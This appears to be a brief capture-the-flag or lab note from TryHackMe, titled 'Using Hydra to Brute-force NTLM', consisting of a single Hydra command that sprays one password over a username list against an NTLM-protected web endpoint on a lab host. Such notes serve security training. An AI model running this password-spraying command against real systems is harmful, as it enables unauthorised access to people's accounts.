# Using Hydra to Brute-force NTLM
```
hydra -I -V -L ./usernames.txt -p 'Changeme123' ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'
```
